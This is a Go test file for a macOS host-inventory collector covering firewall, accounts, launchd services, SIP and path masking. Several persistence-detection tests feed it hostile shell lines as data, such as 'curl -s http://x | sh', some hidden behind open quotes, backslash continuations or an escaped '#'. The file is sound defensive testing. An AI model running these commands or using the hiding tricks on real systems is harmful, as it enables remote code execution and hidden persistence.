package hostenv

import (
	"context"
	"io/fs"
	"strings"
	"testing"
	"time"
)

// errMac is fakeMac whose commands can fail with an error, output kept.
type errMac struct {
	fakeMac
	errs map[string]error
}

func (f errMac) Run(ctx context.Context, argv []string) (CmdResult, error) {
	k := strings.Join(argv, " ")
	if err, ok := f.errs[k]; ok {
		return CmdResult{Stdout: []byte(f.cmds[k])}, err
	}
	return f.fakeMac.Run(ctx, argv)
}

func key(argv []string) string { return strings.Join(argv, " ") }

// N-M1: pf enabled does not make the firewall enabled; pf unreadable does
// not make the fact partial.
func TestDarwinFirewallPfNoted(t *testing.T) {
	src := fakeMac{cmds: map[string]string{
		key(alfStateArgv): "Firewall is disabled. (State = 0)\n", key(alfBlockAllArgv): "Firewall has block all state set to disabled.\n",
		key(alfStealthArgv): "Firewall stealth mode is off\n", key(pfInfoArgv): "Status: Enabled for 0 days 00:01:02\n"}}
	fw := DarwinCollector{}.Firewall(context.Background(), src)
	if fw.Status != StatusOK || fw.Value.Enabled || fw.Value.Extra["pf"] != "enabled (rules not read)" {
		t.Errorf("pf enabled: %+v", fw)
	}
	delete(src.cmds, key(pfInfoArgv))
	if fw = (DarwinCollector{}).Firewall(context.Background(), src); fw.Status != StatusOK || fw.Value.Extra["pf"] != "unknown (needs root)" {
		t.Errorf("pf unknown: %+v", fw)
	}
}

// N-M3: a dscl query that fails, and a login account's home outside /Users,
// are said.
func TestDarwinAccountsSaysWhy(t *testing.T) {
	src := fakeMac{cmds: map[string]string{
		key(dsclUIDArgv):   "root 0\nalice 501\nbob 502\n",
		key(dsclHomeArgv):  "root /var/root\nalice /Users/alice\nbob /Volumes/Data/bob\n",
		key(dsclAdminArgv): "GroupMembership: root alice\n"}}
	o := DarwinCollector{}.Accounts(context.Background(), src)
	if o.Status != StatusPartial || !strings.Contains(o.Detail, "shells unknown") {
		t.Errorf("shell query failed: %s %q", o.Status, o.Detail)
	}
	src.cmds[key(dsclShellArgv)] = "root /bin/sh\nalice /bin/zsh\nbob /bin/zsh\n"
	o = DarwinCollector{}.Accounts(context.Background(), src)
	if o.Status != StatusOK {
		t.Errorf("all queries answered: %s %q", o.Status, o.Detail)
	}
	// A home outside /Users is read too, not skipped.
	agent := plistXML("Label", "com.example.bob", "Program", "/Volumes/Data/bob/bin/x")
	svcSrc := fakeMacDirs{fakeMac: fakeMac{files: map[string]string{"/Volumes/Data/bob/Library/LaunchAgents/b.plist": agent}},
		dirs: map[string][]string{"/Volumes/Data/bob/Library/LaunchAgents": {"b.plist"}}}
	svcs, _ := DarwinCollector{}.Services(svcSrc, o)
	found := false
	for _, s := range svcs.Value {
		found = found || s.Name == "com.example.bob"
	}
	if !found {
		t.Errorf("agents of a home outside /Users not read: %+v", svcs)
	}
}

// N-M4: ps args cut short keeps what came and is partial; failing is partial.
func TestDarwinProcessesArgsPartial(t *testing.T) {
	ps := "  10     1   501 alice    01:00 /Applications/ExampleEditor.app/Contents/MacOS/ExampleEditor\n"
	src := errMac{fakeMac: fakeMac{cmds: map[string]string{key(macPsArgv): ps, key(macPsArgsArgv): "  10 /Applications/ExampleEditor.app/Contents/MacOS/ExampleEditor --x\n"}},
		errs: map[string]error{key(macPsArgsArgv): ErrTruncated}}
	o := DarwinCollector{}.Processes(context.Background(), src, time.Now())
	if o.Status != StatusPartial || !strings.Contains(o.Detail, "cut short") || len(o.Value) != 1 || o.Value[0].Cmdline == "" {
		t.Errorf("args cut: %+v", o)
	}
	src.errs[key(macPsArgsArgv)] = ErrTimeout
	if o = (DarwinCollector{}).Processes(context.Background(), src, time.Now()); o.Status != StatusPartial || o.Reason != ReasonTimeout {
		t.Errorf("args timed out: %+v", o)
	}
	delete(src.errs, key(macPsArgsArgv))
	delete(src.cmds, key(macPsArgsArgv))
	if o = (DarwinCollector{}).Processes(context.Background(), src, time.Now()); o.Status != StatusPartial || !strings.Contains(o.Detail, "command lines unknown") {
		t.Errorf("args failed: %+v", o)
	}
}

// N-M6: XProtect's real-time protection is said to be assumed.
func TestDarwinXProtectAssumed(t *testing.T) {
	src := statMac{fakeMac: fakeMac{files: map[string]string{xprotectBundles[0]: "<plist><dict></dict></plist>"}}}
	o := DarwinCollector{}.XProtect(src, time.Now())
	if !o.Value.RealTime || !strings.Contains(o.Detail, "real_time assumed") {
		t.Errorf("%+v", o)
	}
}

// statMac answers Stat for the files it holds.
type statMac struct{ fakeMac }

func (s statMac) Stat(p string) (FileStat, error) {
	if _, ok := s.files[p]; ok {
		return FileStat{ModTime: time.Now().Add(-48 * time.Hour)}, nil
	}
	return FileStat{}, &notExist{p}
}

// netstat past the output cap keeps what was read, partial (not unknown).
func TestDarwinNetstatCutKept(t *testing.T) {
	head := "Active Internet connections (including servers)\nProto Recv-Q Send-Q  Local Address          Foreign Address        (state)          rxbytes      txbytes  rhiwat  shiwat          process:pid    state  options           gencnt    flags   flags1 usecnt rtncnt fltrs\n"
	tcp := head + "tcp4       0      0  *.22                   *.*                    LISTEN                 0            0  131072  131072          launchd:1      00100 00000006 0000000001 00000001 00000800      1      0 000000\n"
	src := errMac{fakeMac: fakeMac{cmds: map[string]string{key(netstatTCPArgv): tcp, key(netstatUDPArgv): head}},
		errs: map[string]error{key(netstatTCPArgv): ErrTruncated}}
	o := DarwinCollector{}.Listeners(context.Background(), src)
	if o.Status != StatusPartial || o.Reason != ReasonTruncated || len(o.Value) != 1 || o.Value[0].Port != 22 {
		t.Errorf("%+v", o)
	}
}

// launchd: UserName says whom a daemon runs as; launchctl's overrides turn
// jobs off or on; a path with spaces is kept whole; a link anywhere below a
// home stops the walk.
func TestDarwinLaunchdUserOverridesLinks(t *testing.T) {
	daemon := plistXML("Label", "com.example.d", "UserName", "_example", "RunAtLoad", "<true/>",
		"ProgramArguments", "<array><string>/Library/Application Support/Ex/run</string><string>-x</string></array>")
	overrides := plistXML("com.example.d", "<true/>")
	src := linkMac{fakeMacDirs: fakeMacDirs{fakeMac: fakeMac{files: map[string]string{
		"/Library/LaunchDaemons/d.plist": daemon, launchOverrides: overrides}},
		dirs: map[string][]string{"/Library/LaunchDaemons": {"d.plist"}, "/Users/alice/Library/LaunchAgents": {}}},
		links: map[string]bool{"/Users/alice/Library": true}}
	o, _ := DarwinCollector{}.Services(src, OK([]Account{{Name: "alice", UID: "501", Home: "/Users/alice", CanLogin: true}}))
	if len(o.Value) != 1 || o.Value[0].RunAs != "_example" || o.Value[0].StartMode != "disabled" || o.Value[0].Exe != "/Library/Application Support/Ex/run" {
		t.Errorf("services %+v", o.Value)
	}
	if o.Status != StatusPartial || !strings.Contains(o.Detail, "symlink_not_followed: /Users/alice/Library") {
		t.Errorf("link below the home: %s %q", o.Status, o.Detail)
	}
}

// plistXML builds an XML plist dict; values starting with "<" are raw.
func plistXML(kv ...string) string {
	s := "<plist><dict>"
	for i := 0; i+1 < len(kv); i += 2 {
		v := kv[i+1]
		if !strings.HasPrefix(v, "<") {
			v = "<string>" + v + "</string>"
		}
		s += "<key>" + kv[i] + "</key>" + v
	}
	return s + "</dict></plist>"
}

// linkMac is fakeMacDirs where some paths are symbolic links.
type linkMac struct {
	fakeMacDirs
	links map[string]bool
}

func (l linkMac) Readlink(p string) (string, error) {
	if l.links[p] {
		return "/elsewhere", nil
	}
	return "", &notExist{p}
}

// N-M5: a path below a home is masked to the end of its field: commas,
// parentheses, runs of spaces, "-", "=" and ":" do not stop it; a kept
// place stays and what follows it is masked again.
func TestHomePathWithSpaces(t *testing.T) {
	m := &Masker{Users: []string{"alice"}}
	m.init()
	for _, in := range []string{
		"/Users/alice/Desktop/Client Files/plan v2.txt --out /Users/alice/Library/LaunchAgents/a.plist",
		"/Users/alice/Clients/Acme, Inc (2026)/q3:plan=final - draft.txt",
		"/Users/alice/Projects/a  b/c",
	} {
		got := m.text(in, true, true)
		for _, leak := range []string{"Client", "Acme", "Inc", "2026", "plan", "draft", "Projects", "a  b"} {
			if strings.Contains(got, leak) {
				t.Errorf("%q -> %q leaks %q", in, got, leak)
			}
		}
		if !strings.HasPrefix(got, "/Users/user1/redacted") {
			t.Errorf("%q -> %q", in, got)
		}
	}
	got := m.text("/Users/alice/.ssh/authorized_keys /Users/alice/Desktop/secret, notes; next", true, true)
	if !strings.HasPrefix(got, "/Users/user1/.ssh/authorized_keys /Users/user1/redacted") || strings.Contains(got, "secret") || !strings.HasSuffix(got, "; next") {
		t.Errorf("kept then masked: %q", got)
	}
	// A kept file name that goes on past a space: the rest is masked.
	got = m.text("/Users/alice/.ssh/authorized keys of Acme --x", true, true)
	if strings.Contains(got, "Acme") || !strings.HasPrefix(got, "/Users/user1/.ssh/authorized redacted") || !strings.HasSuffix(got, " --x") {
		t.Errorf("kept name with a space: %q", got)
	}
	// /Users/Shared is masked below it; "redactedfoo" is not taken as masked.
	if got = m.text("/Users/Shared/Clients/Acme Inc/plan.txt", true, true); strings.Contains(got, "Acme") || !strings.HasPrefix(got, "/Users/Shared/redacted") {
		t.Errorf("Shared: %q", got)
	}
	if got = m.text("/Users/alice/redactedfoo/Acme", true, true); strings.Contains(got, "Acme") {
		t.Errorf("redactedfoo kept: %q", got)
	}
}

// S: a dscl home path with spaces (two in a row too) is kept whole.
func TestDsclHomeWithSpaces(t *testing.T) {
	m := dsclList([]byte("alice                   /Users/alice\nbob                     /Volumes/Data/Bob  Smith\n"))
	if m["alice"] != "/Users/alice" || m["bob"] != "/Volumes/Data/Bob  Smith" {
		t.Errorf("%q", m)
	}
}

// launchctl's system overrides apply to daemons only: a user agent named like
// a turned-off daemon is not taken as off.
func TestDarwinOverridesSystemOnly(t *testing.T) {
	agent := plistXML("Label", "com.example.d", "Program", "/Users/alice/x", "RunAtLoad", "<true/>")
	src := fakeMacDirs{fakeMac: fakeMac{files: map[string]string{
		"/Users/alice/Library/LaunchAgents/a.plist": agent, launchOverrides: plistXML("com.example.d", "<true/>")}},
		dirs: map[string][]string{"/Users/alice/Library/LaunchAgents": {"a.plist"}}}
	o, _ := DarwinCollector{}.Services(src, OK([]Account{{Name: "alice", UID: "501", Home: "/Users/alice", CanLogin: true}}))
	if len(o.Value) != 1 || o.Value[0].StartMode != "auto" {
		t.Errorf("agent taken as off by the system override: %+v", o.Value)
	}
}

// N-M3: accounts unknown (dscl failed): user LaunchAgents are said not read.
// N-M7: a user's disabled.<uid>.plist turns off that user's agent only.
func TestDarwinServicesAccountsAndUserOverrides(t *testing.T) {
	o, _ := DarwinCollector{}.Services(fakeMacDirs{fakeMac: fakeMac{}}, Unknown[[]Account](ReasonCommandFailed, "dscl: exit 1"))
	if o.Status != StatusPartial || !strings.Contains(o.Detail, "user LaunchAgents not read (accounts unknown: dscl: exit 1)") {
		t.Errorf("accounts unknown: %s %q", o.Status, o.Detail)
	}
	agent := plistXML("Label", "com.example.a", "Program", "/x", "RunAtLoad", "<true/>")
	src := fakeMacDirs{fakeMac: fakeMac{files: map[string]string{
		"/Users/alice/Library/LaunchAgents/a.plist": agent, "/Users/bob/Library/LaunchAgents/a.plist": agent,
		userOverrides("501"): plistXML("com.example.a", "<true/>")}},
		dirs: map[string][]string{"/Users/alice/Library/LaunchAgents": {"a.plist"}, "/Users/bob/Library/LaunchAgents": {"a.plist"}}}
	o, jobs := DarwinCollector{}.Services(src, OK([]Account{{Name: "alice", UID: "501", Home: "/Users/alice", CanLogin: true}, {Name: "bob", UID: "502", Home: "/Users/bob", CanLogin: true}}))
	got := map[string]bool{}
	for _, j := range jobs {
		got[j.path] = j.disabled
	}
	if !got["/Users/alice/Library/LaunchAgents/a.plist"] || got["/Users/bob/Library/LaunchAgents/a.plist"] {
		t.Errorf("per-user overrides: %v (%+v)", got, o)
	}
}

// N-M8: periodic.conf is read as VAR=value: *_local, local_periodic and
// *_enable="YES" are listed; other settings and comments are not.
func TestParsePeriodicConf(t *testing.T) {
	conf := "# comment\ndaily_local=\"/etc/daily.local /usr/local/bin/backdoor\"\nlocal_periodic='/usr/local/etc/periodic /opt/x/periodic'\n" +
		"daily_clean_tmps_enable=\"YES\"\nweekly_status_security_enable=\"NO\"\ndaily_output=\"/var/log/daily.out\"\n"
	got := ParsePeriodicConf([]byte(conf))
	want := []string{"daily_local=/etc/daily.local /usr/local/bin/backdoor", "local_periodic=/usr/local/etc/periodic /opt/x/periodic", "daily_clean_tmps_enable=YES"}
	if strings.Join(got, "|") != strings.Join(want, "|") {
		t.Errorf("got %q", got)
	}
	// N-b: anything that is not a plain assignment is listed whole.
	got = ParsePeriodicConf([]byte("a=1; curl -s http://x | sh\n. /opt/x/evil.sh\n/usr/local/bin/run\nb=$(id)\nc=\"plain\"\n"))
	want = []string{"a=1; curl -s http://x | sh", ". /opt/x/evil.sh", "/usr/local/bin/run", "b=$(id)"}
	if strings.Join(got, "|") != strings.Join(want, "|") {
		t.Errorf("commands: got %q", got)
	}
}

// N-b: every line of daily.local, the defaults' local_periodic folders, and
// scripts in a local_periodic folder are listed; the stock *_enable lines of
// /etc/defaults/periodic.conf are not.
func TestDarwinPeriodicPersistence(t *testing.T) {
	src := fakeMacDirs{fakeMac: fakeMac{files: map[string]string{
		"/etc/daily.local":            "# nightly\n/usr/local/bin/sync-home\necho done\n",
		"/etc/defaults/periodic.conf": "daily_clean_tmps_enable=\"YES\"\nlocal_periodic=\"/usr/local/etc/periodic /opt/x/periodic\"\n",
	}}, dirs: map[string][]string{"/opt/x/periodic/daily": {"999.beacon"}}}
	o := DarwinCollector{}.persistence(src, nil, OK([]Service(nil)), OK([]AuthorizedKeyFile(nil)))
	got := map[string]bool{}
	for _, it := range o.Value {
		got[it.Location+" "+it.Command] = true
	}
	for _, k := range []string{"/etc/daily.local /usr/local/bin/sync-home", "/etc/daily.local echo done",
		"/etc/defaults/periodic.conf local_periodic=/usr/local/etc/periodic /opt/x/periodic", "/opt/x/periodic/daily/999.beacon "} {
		if !got[k] {
			t.Errorf("missing %q in %v", k, got)
		}
	}
	if got["/etc/defaults/periodic.conf daily_clean_tmps_enable=YES"] {
		t.Error("stock *_enable listed")
	}
}

// countMac counts how often each command runs.
type countMac struct {
	fakeMac
	runs map[string]int
}

func (c countMac) Run(ctx context.Context, argv []string) (CmdResult, error) {
	c.runs[key(argv)]++
	return c.fakeMac.Run(ctx, argv)
}

// S: SIP in a custom configuration is off with a correct detail (not "no
// answer"), and each protection command runs once.
func TestDarwinProtectionsCustomOnce(t *testing.T) {
	src := countMac{fakeMac: fakeMac{cmds: map[string]string{
		key(csrutilArgv):  "System Integrity Protection status: unknown (Custom Configuration).\n\nConfiguration:\n\tKext Signing: disabled\n",
		key(spctlArgv):    "assessments enabled\n",
		key(fdesetupArgv): "FileVault is On.\n"}}, runs: map[string]int{}}
	o := DarwinCollector{}.Protections(context.Background(), src)
	if o.Status != StatusOK || o.Value.Integrity != "off" || !strings.Contains(o.Detail, "custom configuration") || strings.Contains(o.Detail, "no answer") {
		t.Errorf("%+v", o)
	}
	for k, n := range src.runs {
		if n != 1 {
			t.Errorf("%s ran %d times", k, n)
		}
	}
}

// S: a long Program is cut at MaxCmdline; ProgramArguments with a
// non-string item makes services partial.
func TestDarwinLaunchdProgramCutAndOddArgs(t *testing.T) {
	if prog, cut := launchProgram(map[string]any{"Program": "/x/" + strings.Repeat("a", 2000)}); !cut || len(prog) > MaxCmdline+len("…") {
		t.Errorf("Program not cut: %d bytes, cut %v", len(prog), cut)
	}
	odd := plistXML("Label", "com.example.odd", "ProgramArguments", "<array><string>/x</string><integer>7</integer></array>")
	src := fakeMacDirs{fakeMac: fakeMac{files: map[string]string{"/Library/LaunchDaemons/o.plist": odd}},
		dirs: map[string][]string{"/Library/LaunchDaemons": {"o.plist"}}}
	o, _ := DarwinCollector{}.Services(src, OK([]Account(nil)))
	if o.Status != StatusPartial || !strings.Contains(o.Detail, "non-string items") {
		t.Errorf("%s %q", o.Status, o.Detail)
	}
}

// N-a: a global agent is disabled only when every login account has it off;
// one account that has it on (or follows a plist that runs it) keeps it on.
func TestDarwinGlobalAgentOverrides(t *testing.T) {
	agent := plistXML("Label", "com.example.g", "Program", "/x", "RunAtLoad", "<true/>")
	accts := OK([]Account{{Name: "alice", UID: "501", Home: "/Users/alice", CanLogin: true}, {Name: "bob", UID: "502", Home: "/Users/bob", CanLogin: true}})
	run := func(files map[string]string) bool {
		files["/Library/LaunchAgents/g.plist"] = agent
		src := fakeMacDirs{fakeMac: fakeMac{files: files}, dirs: map[string][]string{"/Library/LaunchAgents": {"g.plist"}}}
		_, jobs := DarwinCollector{}.Services(src, accts)
		return jobs[0].disabled
	}
	off := plistXML("com.example.g", "<true/>")
	if run(map[string]string{userOverrides("501"): off}) {
		t.Error("off for alice only, bob still runs it: taken as disabled")
	}
	if !run(map[string]string{userOverrides("501"): off, userOverrides("502"): off}) {
		t.Error("off for every login account: not disabled")
	}
}

// deniedMac is fakeMacDirs where some files cannot be read (EACCES).
type deniedMac struct {
	fakeMacDirs
	denied map[string]bool
}

func (d deniedMac) ReadFile(p string) ([]byte, error) {
	if d.denied[p] {
		return nil, &fs.PathError{Op: "open", Path: p, Err: fs.ErrPermission}
	}
	return d.fakeMacDirs.ReadFile(p)
}

// N-a1: an override file that cannot be read or parsed leaves the job's
// state unknown: a plist's Disabled=true is not taken as off, and the file
// is listed. N-a2: with accounts unknown, a global agent is not taken as
// off either, and that is said.
func TestDarwinOverridesUnknownNotOff(t *testing.T) {
	off := plistXML("Label", "com.example.g", "Program", "/x", "Disabled", "<true/>")
	accts := OK([]Account{{Name: "alice", UID: "501", Home: "/Users/alice", CanLogin: true}})
	dirs := map[string][]string{"/Library/LaunchAgents": {"g.plist"}, "/Library/LaunchDaemons": {"d.plist"}}
	base := func(files map[string]string) map[string]string {
		files["/Library/LaunchAgents/g.plist"] = off
		files["/Library/LaunchDaemons/d.plist"] = strings.Replace(off, "com.example.g", "com.example.d", 1)
		return files
	}
	// alice's overrides unreadable; the system's unparsable.
	src := deniedMac{fakeMacDirs: fakeMacDirs{fakeMac: fakeMac{files: base(map[string]string{launchOverrides: "not a plist"})}, dirs: dirs},
		denied: map[string]bool{userOverrides("501"): true}}
	o, jobs := DarwinCollector{}.Services(src, accts)
	for _, j := range jobs {
		if j.disabled {
			t.Errorf("%s taken as off with its overrides unknown", j.label)
		}
	}
	if !strings.Contains(o.Detail, userOverrides("501")+" (permission_denied)") || !strings.Contains(o.Detail, launchOverrides+" (unparsable)") {
		t.Errorf("unread %q", o.Detail)
	}
	// Overrides readable and silent: the plist's Disabled stands.
	src2 := fakeMacDirs{fakeMac: fakeMac{files: base(map[string]string{})}, dirs: dirs}
	if _, jobs = (DarwinCollector{}).Services(src2, accts); !jobs[0].disabled || !jobs[1].disabled {
		t.Errorf("plist Disabled not kept: %+v", jobs)
	}
	// N-a2: accounts unknown.
	o, jobs = DarwinCollector{}.Services(src2, Unknown[[]Account](ReasonCommandFailed, "dscl: exit 1"))
	for _, j := range jobs {
		if j.scope == "agent" && j.disabled {
			t.Errorf("global agent taken as off with accounts unknown")
		}
	}
	if !strings.Contains(o.Detail, "global agents' per-user overrides not checked") {
		t.Errorf("unread %q", o.Detail)
	}
}

// N-b2: a quote left open and a backslash at the end join lines as the shell
// does, so a command hidden after them is listed with them; an unquoted
// value holding a quote or backslash is not a plain assignment.
func TestParsePeriodicConfShellLines(t *testing.T) {
	for _, c := range []struct{ conf, want string }{
		{"a=\"\n# \"; curl -s http://x | sh\n", "a=\"\n# \"; curl -s http://x | sh"},
		{"a=x\\\n#; curl -s http://x | sh\n", "a=x\\\n#; curl -s http://x | sh"},
		{"b=it\\'s\n", "b=it\\'s"},
		{"c=say\"hi\"\n", "c=say\"hi\""},
	} {
		got := ParsePeriodicConf([]byte(c.conf))
		if len(got) != 1 || got[0] != c.want {
			t.Errorf("%q: got %q", c.conf, got)
		}
	}
	if got := ParsePeriodicConf([]byte("# a comment \"\nd=\"plain\"\n")); len(got) != 0 {
		t.Errorf("comment with a quote, then a plain line: %q", got)
	}
}

// N-b1: every line of a .local file but blanks and comments is listed,
// whatever its shape. S: the defaults list only local_periodic and *_local.
func TestDarwinLocalAndDefaults(t *testing.T) {
	local := "# header\n\nX=$(curl -s http://x | sh)\na=1; curl -s http://y | sh\nPATH=/tmp/evil:$PATH\ny=\"\n# \"; id\n"
	defaults := "daily_clean_tmps_enable=\"YES\"\nlocal_periodic=\"/usr/local/etc/periodic\"\ndaily_local=\"/etc/daily.local\"\n. /etc/periodic.conf.local\n"
	src := fakeMacDirs{fakeMac: fakeMac{files: map[string]string{"/etc/daily.local": local, "/etc/defaults/periodic.conf": defaults}}}
	o := DarwinCollector{}.persistence(src, nil, OK([]Service(nil)), OK([]AuthorizedKeyFile(nil)))
	var daily, def []string
	for _, it := range o.Value {
		switch it.Location {
		case "/etc/daily.local":
			daily = append(daily, it.Command)
		case "/etc/defaults/periodic.conf":
			def = append(def, it.Command)
		}
	}
	want := []string{"X=$(curl -s http://x | sh)", "a=1; curl -s http://y | sh", "PATH=/tmp/evil:$PATH", "y=\"\n# \"; id"}
	if strings.Join(daily, "|") != strings.Join(want, "|") {
		t.Errorf("daily.local: %q", daily)
	}
	if strings.Join(def, "|") != "local_periodic=/usr/local/etc/periodic|daily_local=/etc/daily.local|. /etc/periodic.conf.local" {
		t.Errorf("defaults: %q", def)
	}
}

// S: dscl values keep their trailing spaces (part of a path).
func TestDsclTrailingSpace(t *testing.T) {
	if m := dsclList([]byte("carol   /Users/carol \n")); m["carol"] != "/Users/carol " {
		t.Errorf("%q", m["carol"])
	}
}

// A command added to /etc/defaults/periodic.conf is listed; the stock
// function lines and commented assignments are not.
func TestDefaultsPeriodicConfStockOnly(t *testing.T) {
	stock := "periodic_conf_files=\"/etc/periodic.conf /etc/periodic.conf.local\"\n" +
		"daily_clean_tmps_enable=\"YES\"\t\t# Delete stuff daily\n" +
		"if [ -z \"${source_periodic_confs_defined}\" ]; then\n\tsource_periodic_confs_defined=yes\n\tsource_periodic_confs () {\n\t\tlocal i sourced_files\n\n" +
		"\t\tfor i in ${periodic_conf_files}; do\n\t\t\tcase ${sourced_files} in\n\t\t\t*:$i:*)\n\t\t\t\t;;\n\t\t\t*)\n" +
		"\t\t\t\tsourced_files=\"${sourced_files}:$i:\"\n\t\t\t\t[ -r $i ] && . $i\n\t\t\t\t;;\n\t\t\tesac\n\t\tdone\n\t}\nfi\n"
	if got := parsePeriodicConf([]byte(stock), true); len(got) != 0 {
		t.Errorf("stock defaults listed: %q", got)
	}
	if got := parsePeriodicConf([]byte(stock+"curl -s http://x | sh\n"), true); len(got) != 1 || got[0] != "curl -s http://x | sh" {
		t.Errorf("added command: %q", got)
	}
	if got := ParsePeriodicConf([]byte("weekly_x_enable=\"YES\"   # why\n")); len(got) != 1 || got[0] != "weekly_x_enable=YES" {
		t.Errorf("commented assignment: %q", got)
	}
}

// A line goes on only after an odd backslash at its end, outside single
// quotes and comments.
func TestShellLinesBackslashes(t *testing.T) {
	cases := []struct {
		in   string
		want int
	}{
		{"a=x" + `\\` + "\nb=y\n", 2},  // a=x\\ : even, ends
		{"a=x" + `\` + "\nb=y\n", 1},   // a=x\ : goes on
		{"a=x" + `\\\` + "\nb=y\n", 1}, // three: goes on
		{"# x" + `\` + "\nb=y\n", 2},   // in a comment: ends
		{"a='x" + `\` + "'\nb=y\n", 2}, // in single quotes: a plain character
	}
	for _, c := range cases {
		n := 0
		for _, l := range shellLines([]byte(c.in)) {
			if strings.TrimSpace(l) != "" {
				n++
			}
		}
		if n != c.want {
			t.Errorf("%q: %d lines %q", c.in, n, shellLines([]byte(c.in)))
		}
	}
}

// A '#' after an escaped space is no comment: the line is judged and listed
// whole, so nothing after it is hidden.
func TestPeriodicConfEscapedHash(t *testing.T) {
	for _, l := range []string{`a=x\ #;curl -s http://x | sh`, "b=$(id) # c", "c=`id` # c"} {
		got := ParsePeriodicConf([]byte(l + "\n"))
		if len(got) != 1 || got[0] != l {
			t.Errorf("%q: got %q", l, got)
		}
	}
}
